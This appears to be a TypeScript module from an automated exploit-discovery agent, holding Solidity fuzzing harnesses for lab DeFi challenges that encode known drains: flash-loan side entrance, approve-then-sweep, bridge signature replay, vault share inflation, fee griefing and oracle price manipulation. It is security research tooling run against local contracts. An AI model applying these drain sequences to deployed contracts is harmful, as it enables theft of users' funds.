// Fuzz-driven exploit synthesis: instead of only replaying known techniques,
// the agent generates an INVARIANT HARNESS for a target and lets the fuzzer
// search for a drain over PRIMITIVE operations (deposit / flash-loan /
// arbitrary call / flag toggles) — not over a hardcoded exploit. A failing
// invariant IS a discovered drain path; the harness prints [SYNTH_PATH] steps
// that reconstruct it.
//
// Everything stays local: the fuzzer runs against the lab's own contracts and
// nothing is ever broadcast. Recipes are full harness files keyed by target
// family; unknown families are reported honestly (extend RECIPES to add one).
import { writeFileSync, mkdirSync, renameSync } from "node:fs";
import { join } from "node:path";
import { AGENT_TEST_DIR, REPORT_DIR } from "./config.ts";
import { sanitizeSoliditySource } from "./fork.ts";

export interface SynthRecipe {
  /** Matches a challenge name (case-insensitive substring). */
  challengeMatch: string;
  /** Full invariant-harness Solidity source. */
  source: string;
  /** What the fuzzer is expected to discover (for honest reporting). */
  expectedFinding: string;
}

const SIDE_ENTRANCE_HARNESS = `// SPDX-License-Identifier: MIT
// AGENT-SYNTHESIZED invariant harness -- {{CHALLENGE}}.
// A third-party VICTIM deposited VICTIM_DEPOSIT and has not withdrawn.
// The fuzzer chooses sequences over PRIMITIVES; the invariant must hold
// for ALL of them. Any pool shortfall = theft the fuzzer discovered.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {SideEntranceLenderPool} from "../../src/challenges/SideEntranceLenderPool.sol";

contract {{CONTRACT}} is Test {
    uint256 constant VICTIM_DEPOSIT = 10 ether;

    SideEntranceLenderPool pool;
    address internal victim;         // third-party depositor (not us)
    bool internal depositInCallback; // primitive: what the flash-loan callback does

    function setUp() public {
        pool = new SideEntranceLenderPool();
        victim = makeAddr("victim");
        vm.deal(victim, VICTIM_DEPOSIT);
        vm.prank(victim);
        pool.deposit{value: VICTIM_DEPOSIT}(); // victim's funds; no honest exit for the harness

        // Search space: this harness's primitives only, never the pool or the
        // victim as sender (known false-positive sources), not anvil accounts.
        targetContract(address(this));
        targetSender(address(this)); // all primitives execute as the harness
        excludeContract(address(pool));
        excludeSender(address(pool));
        excludeSender(victim);
        excludeSender(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38);
    }

    // ---------- PRIMITIVES (the fuzzer orders and parameterizes these) ----------

    function fuzz_setCallbackMode(bool depositInsteadOfNothing) external {
        depositInCallback = depositInsteadOfNothing;
        console2.log("[SYNTH_PATH] setCallbackMode", depositInsteadOfNothing ? uint256(1) : uint256(0));
    }

    function fuzz_flashLoan(uint256 amount) external {
        amount = bound(amount, 0, address(pool).balance);
        console2.log("[SYNTH_PATH] flashLoan", amount);
        pool.flashLoan(amount); // the pool calls back into execute() below
    }

    function fuzz_withdraw() external {
        console2.log("[SYNTH_PATH] withdraw", uint256(0));
        pool.withdraw(); // pays out only OUR credit -- honest unless we booked the loan
    }

    // ---------- flash-loan callback: the SIDE ENTRANCE is a choice, not a fix ----------

    function execute() external payable {
        if (msg.sender == address(pool) && depositInCallback) {
            // The bug-enabling choice: book the loaned ETH as a deposit.
            pool.deposit{value: msg.value}();
            console2.log("[SYNTH_PATH] callback: deposited loaned ETH (side entrance)", msg.value);
        }
    }

    receive() external payable {}

    // ---------- INVARIANT: the pool must still hold the victim's deposit ----------

    function invariant_poolNeverDrained() public view {
        assertGe(address(pool).balance, VICTIM_DEPOSIT, "POOL DRAINED -- fuzzer found the side-entrance path");
    }
}
`;

const TRUSTER_HARNESS = `// SPDX-License-Identifier: MIT
// AGENT-SYNTHESIZED invariant harness -- {{CHALLENGE}}.
// The fuzzer controls flash-loan parameters; the invariant must hold for ALL
// of them. Finding approve-then-sweep = discovered arbitrary-call drain.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {ERC20Mintable} from "../../src/tokens/ERC20Mintable.sol";
import {TrusterLenderPool} from "../../src/challenges/TrusterLenderPool.sol";

contract {{CONTRACT}} is Test {
    uint256 constant VICTIM_DEPOSIT = 1_000_000e18; // depositors' funds parked in the pool

    TrusterLenderPool pool;
    ERC20Mintable token;

    function setUp() public {
        token = new ERC20Mintable("Damn Valuable Token", "DVT");
        pool = new TrusterLenderPool(address(token));
        token.mint(address(this), VICTIM_DEPOSIT);
        token.transfer(address(pool), VICTIM_DEPOSIT);
        targetContract(address(this));
        targetSender(address(this)); // all primitives execute as the harness
        excludeContract(address(pool));
        excludeSender(address(pool));
        excludeSender(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38);
    }

    // ---------- PRIMITIVE: caller-controlled flash loan ----------
    // The fuzzer picks the loan size, which arbitrary call the pool makes
    // (approve or transfer), and its argument. approve-then-sweep in sequence
    // is the only way to move pool tokens from outside -- finding that pair
    // IS the exploit discovery.

    function fuzz_flashLoan(uint256 borrow, uint256 targetIdx, uint256 arg) external {
        borrow = bound(borrow, 0, token.balanceOf(address(pool)));
        arg = bound(arg, 1, token.balanceOf(address(pool)));
        // Bounded call surface: the token's approve/transfer entrypoints.
        address target = address(token);
        bytes4 selector = targetIdx % 2 == 0
            ? token.approve.selector
            : token.transfer.selector;
        console2.log("[SYNTH_PATH] flashLoan arbitrary call", uint256(uint32(selector)));
        pool.flashLoan(borrow, address(this), target, abi.encodeWithSelector(selector, address(this), arg));
    }

    function fuzz_sweep(uint256 amount) external {
        uint256 allowed = token.allowance(address(pool), address(this));
        amount = bound(amount, 0, allowed);
        if (amount > 0) {
            console2.log("[SYNTH_PATH] sweep approved tokens", amount);
            token.transferFrom(address(pool), address(this), amount);
        }
    }

    receive() external payable {}

    // ---------- INVARIANT ----------

    function invariant_poolNeverDrained() public view {
        assertGe(token.balanceOf(address(pool)), VICTIM_DEPOSIT, "POOL DRAINED -- fuzzer found the arbitrary-call path");
    }
}
`;

const BRIDGE_HARNESS = `// SPDX-License-Identifier: MIT
// AGENT-SYNTHESIZED invariant harness -- {{CHALLENGE}}.
// A victim bridged out funds; the relayer signed ONE payout (broadcast
// signatures are public). The fuzzer picks claim parameters; the invariant
// must hold for ALL of them. Any shortfall = replay drain discovered.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {CrossChainBridge} from "../../src/challenges/CrossChainBridge.sol";
import {ERC20Mintable} from "../../src/tokens/ERC20Mintable.sol";

contract {{CONTRACT}} is Test {
    uint256 constant VICTIM_DEPOSIT = 500_000 ether;
    uint256 constant HONEST_PAYOUT = 100_000 ether; // divides the vault balance

    CrossChainBridge bridge;
    ERC20Mintable token;
    bytes internal capturedSig; // the ONE signature observed in the wild
    bytes32 internal constant PAYOUT_TX = keccak256("observed payout tx");

    function setUp() public {
        (address relayer, uint256 relayerPk) = makeAddrAndKey("relayer");
        address victim = makeAddr("victim");

        token = new ERC20Mintable("Bridge Token", "BRG");
        token.mint(victim, VICTIM_DEPOSIT);
        bridge = new CrossChainBridge(address(token), relayer);

        vm.startPrank(victim);
        token.approve(address(bridge), type(uint256).max);
        bridge.deposit(1, VICTIM_DEPOSIT);
        vm.stopPrank();

        // The one honest payout -- and its signature is now public.
        bytes32 messageHash = keccak256(abi.encode(PAYOUT_TX, HONEST_PAYOUT));
        bytes32 digest = keccak256(abi.encodePacked("\\x19Ethereum Signed Message:\\n32", messageHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(relayerPk, digest);
        capturedSig = abi.encodePacked(r, s, v);
        bridge.withdraw(PAYOUT_TX, 7, victim, HONEST_PAYOUT, capturedSig);

        // Search space: this harness only; never the bridge or victim as sender.
        targetContract(address(this));
        targetSender(address(this));
        excludeContract(address(bridge));
        excludeSender(address(bridge));
        excludeSender(victim);
        excludeSender(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38);
    }

    // ---------- PRIMITIVE: submit a claim with fuzzer-chosen claim id ----------
    // The signature binds only (txHash, amount); the on-chain id is
    // (txHash, logIndex). Choosing a fresh logIndex with the SAME signature is
    // the whole attack -- finding repeated paying claims IS the discovery.

    function fuzz_claim(uint256 logIndexSeed) external {
        uint256 logIndex = bound(logIndexSeed, 0, 64);
        console2.log("[SYNTH_PATH] claim logIndex", logIndex);
        // Attacker-chosen recipient: us. low-level call so a spent id does not
        // abort the whole sequence.
        address(bridge).call(
            abi.encodeWithSelector(
                CrossChainBridge.withdraw.selector,
                PAYOUT_TX,
                logIndex,
                address(this),
                HONEST_PAYOUT,
                capturedSig
            )
        );
    }

    receive() external payable {}

    // ---------- INVARIANT: the vault keeps the victim's net collateral ----------

    function invariant_bridgeNeverDrained() public view {
        assertGe(
            token.balanceOf(address(bridge)),
            VICTIM_DEPOSIT - HONEST_PAYOUT,
            "BRIDGE DRAINED -- fuzzer replayed one signature into many payouts"
        );
    }
}
`;

const VAULT_HARNESS = `// SPDX-License-Identifier: MIT
// AGENT-SYNTHESIZED invariant harness -- {{CHALLENGE}}.
// The invariant: once a depositor enters, the vault must always hold at least
// their deposit. The fuzzer orders seed/donate/enter/harvest PRIMITIVES; any
// ordering that lets the vault fall short is a discovered inflation drain.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {StakingVault4626} from "../../src/challenges/StakingVault4626.sol";
import {ERC20Mintable} from "../../src/tokens/ERC20Mintable.sol";

contract {{CONTRACT}} is Test {
    uint256 constant VICTIM_DEPOSIT = 100 ether;

    StakingVault4626 vault;
    ERC20Mintable token;
    address internal victim;
    bool internal victimEntered;

    function setUp() public {
        victim = makeAddr("victim");
        token = new ERC20Mintable("Staking Token", "STK");
        token.mint(victim, VICTIM_DEPOSIT);
        token.mint(address(this), 1_000 ether); // attacker working capital
        vault = new StakingVault4626(address(token), "Staking Vault", "svSTK");

        targetContract(address(this));
        targetSender(address(this));
        excludeContract(address(vault));
        excludeSender(address(vault));
        excludeSender(victim);
        excludeSender(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38);
    }

    // ---------- PRIMITIVES (order is the attacker's choice) ----------

    function fuzz_seedSupply() external {
        if (vault.totalSupply() == 0) {
            token.approve(address(vault), type(uint256).max);
            vault.deposit(1, address(this));
            console2.log("[SYNTH_PATH] seedSupply 1 wei", uint256(1));
        }
    }

    function fuzz_donate(uint256 amount) external {
        amount = bound(amount, 0, token.balanceOf(address(this)));
        if (amount > 0) {
            console2.log("[SYNTH_PATH] donate", amount);
            token.transfer(address(vault), amount);
        }
    }

    function fuzz_victimDeposits() external {
        if (!victimEntered && token.balanceOf(victim) >= VICTIM_DEPOSIT) {
            victimEntered = true;
            console2.log("[SYNTH_PATH] victimDeposits", VICTIM_DEPOSIT);
            vm.prank(victim);
            token.approve(address(vault), type(uint256).max);
            vm.prank(victim);
            vault.deposit(VICTIM_DEPOSIT, victim);
        }
    }

    function fuzz_harvest() external {
        uint256 shares = vault.balanceOf(address(this));
        if (shares > 0) {
            console2.log("[SYNTH_PATH] harvest", shares);
            vault.redeem(shares, address(this), address(this));
        }
    }

    // ---------- INVARIANT: depositors' funds stay redeemable ----------

    function invariant_vaultNeverDrained() public view {
        if (victimEntered) {
            assertGe(
                token.balanceOf(address(vault)),
                VICTIM_DEPOSIT,
                "VAULT DRAINED -- share inflation swallowed the depositor"
            );
        }
    }
}
`;

const NAIVE_RECEIVER_HARNESS = `// SPDX-License-Identifier: MIT
// AGENT-SYNTHESIZED invariant harness -- {{CHALLENGE}}.
// The pool charges a fixed fee per flash loan regardless of who requested it.
// The fuzzer nominates the victim as borrower (forced-fee griefing) to drain it.
// After the victim is bankrupt, credit-confusion drains the pool itself.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {NaiveReceiverPool} from "../../src/challenges/NaiveReceiverPool.sol";
import {NaiveReceiverVictim} from "../../src/challenges/NaiveReceiverVictim.sol";

contract {{CONTRACT}} is Test {
    uint256 constant POOL_DEPOSIT = 1000 ether;
    uint256 constant VICTIM_DEPOSIT = 10 ether;

    NaiveReceiverPool pool;
    NaiveReceiverVictim victim;

    function setUp() public {
        pool = new NaiveReceiverPool();
        vm.deal(address(this), POOL_DEPOSIT + VICTIM_DEPOSIT + 1 ether);
        pool.deposit{value: POOL_DEPOSIT}();
        victim = new NaiveReceiverVictim(address(pool));
        deal(address(victim), VICTIM_DEPOSIT);

        targetContract(address(this));
        targetSender(address(this));
        excludeContract(address(pool));
        excludeContract(address(victim));
        excludeSender(address(pool));
        excludeSender(address(victim));
        excludeSender(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38);
    }

    function fuzz_griefVictim(uint256 amount) external {
        amount = bound(amount, 0, address(pool).balance > 1 ether ? address(pool).balance - 1 : 0);
        console2.log("[SYNTH_PATH] griefVictim", amount);
        (bool ok, ) = address(pool).call(
            abi.encodeWithSignature("flashLoan(address,uint256)", address(victim), amount)
        );
        ok;
    }

    receive() external payable {}

    function invariant_poolNeverDrained() public view {
        uint256 total = address(pool).balance + address(victim).balance;
        assertGe(total, POOL_DEPOSIT, "POOL DRAINED -- forced-fee griefing or credit confusion emptied the pool");
    }
}
`;

const PUPPET_HARNESS = `// SPDX-License-Identifier: MIT
// AGENT-SYNTHESIZED invariant harness -- {{CHALLENGE}}.
// Lending pool prices collateral from AMM spot. Dump tokens to crash
// the price, then borrow the pool cheaply. Invariant: pool never fully drained.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {PuppetPool} from "../../src/challenges/PuppetPool.sol";
import {ERC20Mintable} from "../../src/tokens/ERC20Mintable.sol";
import {IUniswapV1Exchange, UniswapV1Factory} from "../../src/uniswap/UniswapV1.sol";

contract {{CONTRACT}} is Test {
    uint256 constant POOL_TOKENS = 100_000 ether;
    uint256 constant ATTACKER_TOKENS = 25_000 ether;

    PuppetPool pool;
    ERC20Mintable token;
    IUniswapV1Exchange exchange;

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.deal(deployer, 100 ether);
        vm.deal(address(this), 50 ether);

        vm.startPrank(deployer);
        token = new ERC20Mintable("DVT", "DVT");
        token.mint(deployer, 2_000_000 ether);
        UniswapV1Factory factory = new UniswapV1Factory();
        exchange = IUniswapV1Exchange(factory.createPair(address(token)));
        token.approve(address(exchange), 10 ether);
        exchange.addLiquidity{value: 10 ether}(1, 10 ether, block.timestamp + 1 days);
        pool = new PuppetPool(address(token), address(exchange), 2);
        token.transfer(address(pool), POOL_TOKENS);
        token.transfer(address(this), ATTACKER_TOKENS);
        vm.stopPrank();

        targetContract(address(this));
        targetSender(address(this));
        excludeContract(address(pool));
        excludeContract(address(exchange));
        excludeSender(address(pool));
        excludeSender(address(exchange));
        excludeSender(deployer);
        excludeSender(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38);
    }

    function fuzz_dump(uint256 amount) external {
        amount = bound(amount, 0, token.balanceOf(address(this)));
        if (amount == 0) return;
        console2.log("[SYNTH_PATH] dump", amount);
        token.approve(address(exchange), amount);
        exchange.tokenToEthSwapInput(amount, 1, block.timestamp + 1 hours);
    }

    function fuzz_borrow(uint256 amount) external {
        amount = bound(amount, 0, token.balanceOf(address(pool)));
        if (amount == 0) return;
        // Collateral must come from the pool's PUBLIC surface: this challenge
        // exposes borrowingFactor() and computeOraclePrice(), and the required
        // deposit is amount * factor * price / 1e18. The recipe used to call
        // calculateDepositRequired(), which exists in the upstream version of
        // this challenge but is internal here -- so the harness never compiled
        // and the fuzzer was never given a chance to find the drain.
        uint256 collateral = amount * pool.borrowingFactor() * pool.computeOraclePrice() / 10 ** 18;
        if (address(this).balance < collateral) return;
        console2.log("[SYNTH_PATH] borrow", amount);
        pool.borrow{value: collateral}(amount);
    }

    receive() external payable {}

    function invariant_poolNeverDrained() public view {
        assertGt(token.balanceOf(address(pool)), 0, "POOL DRAINED -- oracle manipulation emptied the lending pool");
    }
}
`;

const FREE_RIDER_HARNESS = `// SPDX-License-Identifier: MIT
// AGENT-SYNTHESIZED invariant harness -- {{CHALLENGE}}.
// Marketplace charges one price for N items in a batch. Invariant: total ETH
// collected must equal NFT_PRICE * items_sold (overcredit breaks this).
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {FreeRiderPool} from "../../src/challenges/FreeRiderPool.sol";
import {NaiveReceiverPool} from "../../src/challenges/NaiveReceiverPool.sol";
import {ERC721} from "../../src/tokens/ERC721.sol";

contract {{CONTRACT}} is Test {
    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant NFT_COUNT = 6;

    FreeRiderPool marketplace;
    NaiveReceiverPool lender;
    ERC721 nft;
    uint256[] allIds;

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.deal(deployer, 1100 ether);
        vm.deal(address(this), 1 ether);

        vm.startPrank(deployer);
        nft = new ERC721("NFT", "NFT");
        lender = new NaiveReceiverPool();
        lender.deposit{value: 1000 ether}();
        marketplace = new FreeRiderPool(address(nft));
        allIds = new uint256[](NFT_COUNT);
        uint256[] memory prices = new uint256[](NFT_COUNT);
        for (uint256 i = 0; i < NFT_COUNT; i++) {
            allIds[i] = i; prices[i] = NFT_PRICE;
            nft.mint(deployer);
        }
        nft.setApprovalForAll(address(marketplace), true);
        marketplace.offerMany(allIds, prices);
        deal(address(marketplace), 90 ether);
        vm.stopPrank();

        targetContract(address(this));
        targetSender(address(this));
        excludeContract(address(marketplace));
        excludeContract(address(lender));
        excludeSender(address(marketplace));
        excludeSender(deployer);
        excludeSender(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38);
    }

    function fuzz_buyMany(uint256 nSeed) external {
        uint256 n = bound(nSeed, 1, NFT_COUNT);
        uint256[] memory ids = new uint256[](n);
        for (uint256 i = 0; i < n; i++) ids[i] = allIds[i];
        console2.log("[SYNTH_PATH] buyMany", n);
        (bool ok, ) = address(marketplace).call{value: NFT_PRICE}(
            abi.encodeWithSignature("buyMany(uint256[])", ids)
        );
        ok;
    }

    receive() external payable {}

    function invariant_marketplaceNeverOvercredited() public view {
        uint256 remaining = 0;
        for (uint256 i = 0; i < NFT_COUNT; i++) {
            try nft.ownerOf(i) returns (address owner) {
                if (owner == address(marketplace)) remaining++;
            } catch {}
        }
        uint256 sold = NFT_COUNT - remaining;
        assertGe(
            address(marketplace).balance,
            sold * NFT_PRICE,
            "POOL DRAINED -- batch overcredit: sold NFTs for less than listing price total"
        );
    }
}
`;

export const SYNTH_RECIPES: SynthRecipe[] = [
  {
    challengeMatch: "SideEntrance",
    source: SIDE_ENTRANCE_HARNESS,
    expectedFinding:
      "fuzzer should discover: flashLoan with callback-deposit (side entrance) then withdraw",
  },
  {
    challengeMatch: "Truster",
    source: TRUSTER_HARNESS,
    expectedFinding: "fuzzer should discover: zero-amount loan forces pool approve, then sweep",
  },
  {
    challengeMatch: "CrossChainBridge",
    source: BRIDGE_HARNESS,
    expectedFinding: "fuzzer should discover: one broadcast signature replayed under fresh claim ids",
  },
  {
    challengeMatch: "StakingVault",
    source: VAULT_HARNESS,
    expectedFinding: "fuzzer should discover: seed-then-donate ordering that zeroes late depositors' shares",
  },
  {
    challengeMatch: "NaiveReceiver",
    source: NAIVE_RECEIVER_HARNESS,
    expectedFinding: "fuzzer should discover: forced fee griefing drains victim, then credit confusion drains pool",
  },
  {
    challengeMatch: "Puppet",
    source: PUPPET_HARNESS,
    expectedFinding: "fuzzer should discover: dump AMM spot price then borrow pool tokens cheaply",
  },
  {
    challengeMatch: "FreeRider",
    source: FREE_RIDER_HARNESS,
    expectedFinding: "fuzzer should discover: batch buy charges one price for N items (overcredit)",
  },
];

export function synthesizeHarness(challengeName: string, variantIdx: number): { filePath: string; contractName: string; recipe: SynthRecipe } | null {
  const recipe = SYNTH_RECIPES.find((r) =>
    challengeName.toLowerCase().includes(r.challengeMatch.toLowerCase())
  );
  if (!recipe) return null;

  const contractName = `Synth_${challengeName.replace(/[^A-Za-z0-9_]/g, "_")}_v${variantIdx}`;
  const source = recipe.source.replace(/\{\{CONTRACT\}\}/g, contractName).replace(/\{\{CHALLENGE\}\}/g, challengeName);

  mkdirSync(AGENT_TEST_DIR, { recursive: true });
  const filePath = join(AGENT_TEST_DIR, `${contractName}.t.sol`);
  writeFileSync(filePath, sanitizeSoliditySource(source));
  return { filePath, contractName, recipe };
}

export function recipeForChallenge(challengeName: string): SynthRecipe | null {
  return (
    SYNTH_RECIPES.find((r) => challengeName.toLowerCase().includes(r.challengeMatch.toLowerCase())) ??
    null
  );
}

/** Move a synth harness out of the test tree into reports/synth/ as evidence. */
export function archiveHarness(filePath: string, contractName: string): string {
  try {
    const dir = join(REPORT_DIR, "synth");
    mkdirSync(dir, { recursive: true });
    const dest = join(dir, `${contractName}.t.sol`);
    renameSync(filePath, dest);
    return dest;
  } catch {
    return filePath;
  }
}

export interface SynthEvaluation {
  discovered: boolean; // invariant genuinely broken by the fuzzer
  compileError: boolean; // harness failed to build — NEVER count as discovery
  /** The compiler's own words (first error lines). A harness that cannot build
   * is an agent bug, and without this excerpt the bug is undiagnosable from a
   * log that only says "failed to compile". */
  compileErrorDetail?: string;
  path: string; // reconstructed [SYNTH_PATH] steps, if logged
}

/** Pull the first compiler error (with its source location) out of forge
 * output, for evidence and for the harness-generation learning loop. */
export function compileErrorExcerpt(output: string): string | undefined {
  const m = output.match(/Error\s*\(\d+\):[^\n]*\n(?:[^\n]*\n){0,3}/);
  if (m) return m[0].trim().slice(0, 500);
  const alt = output.match(/(Compiler run failed[^\n]*)/);
  return alt ? alt[1].trim().slice(0, 500) : undefined;
}

/** Classify a synth run: compile failure vs held invariant vs real discovery. */
export function evaluateSynthOutput(output: string): SynthEvaluation {
  const compileError = /Compiler run failed|Error \(\d+\)/.test(output);
  // The custom assert message is embedded in the FAIL reason line, e.g.
  // "[FAIL: POOL DRAINED -- ...: 0 < 10000000000000000000]" — robust even
  // with the [Sequence]/shrink block between it and the invariant name.
  // (Each synth recipe names its own drained asset: POOL/BRIDGE/VAULT.)
  const invariantFailed = /\[FAIL[^\]]*(POOL|BRIDGE|VAULT) DRAINED/.test(output);
  const path = [...output.matchAll(/\[SYNTH_PATH\]\s+(\S+)/g)]
    .map((m) => m[1]!)
    .join(" -> ");
  return {
    discovered: !compileError && invariantFailed,
    compileError,
    compileErrorDetail: compileError ? compileErrorExcerpt(output) : undefined,
    path,
  };
}
